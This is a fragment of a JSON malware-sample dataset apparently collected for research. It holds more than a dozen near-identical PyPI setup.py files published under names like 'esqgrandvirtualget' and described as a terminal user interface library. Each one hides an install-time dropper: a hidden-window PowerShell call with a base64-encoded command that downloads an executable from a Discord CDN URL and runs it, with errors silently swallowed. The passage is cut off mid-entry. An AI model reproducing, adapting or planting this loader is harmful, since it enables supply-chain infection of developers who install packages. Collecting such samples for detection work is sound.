        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqgrandvirtualget-v4.22",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgrandvirtualget',\n    packages = ['modlib'],\n    version = '7.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqhttpmaskload-v8.19",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqhttpmaskload',\n    packages = ['modlib'],\n    version = '4.41',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqintcvgui-v6.43",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqintcvgui',\n    packages = ['modlib'],\n    version = '5.44',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqintstringcraft-v9.30",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqintstringcraft',\n    packages = ['modlib'],\n    version = '8.73',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqlibcpucc-v9.61",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqlibcpucc',\n    packages = ['modlib'],\n    version = '10.3',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqlibpullreplace-v6.11",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqlibpullreplace',\n    packages = ['modlib'],\n    version = '6.17',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqmaskgrandcc-v6.23",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmaskgrandcc',\n    packages = ['modlib'],\n    version = '5.2',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqpostloadping-v6.22",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpostloadping',\n    packages = ['modlib'],\n    version = '1.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqproofpostpull-v10.60",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqproofpostpull',\n    packages = ['modlib'],\n    version = '6.99',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqrandadget-v3.2",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrandadget',\n    packages = ['modlib'],\n    version = '3.65',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqreinfore-v5.34",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqreinfore',\n    packages = ['modlib'],\n    version = '8.35',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqrepymc-v5.43",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrepymc',\n    packages = ['modlib'],\n    version = '4.90',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqstringgamere-v10.81",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstringgamere',\n    packages = ['modlib'],\n    version = '8.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqstringminecv-v3.8",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstringminecv',\n    packages = ['modlib'],\n    version = '3.64',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      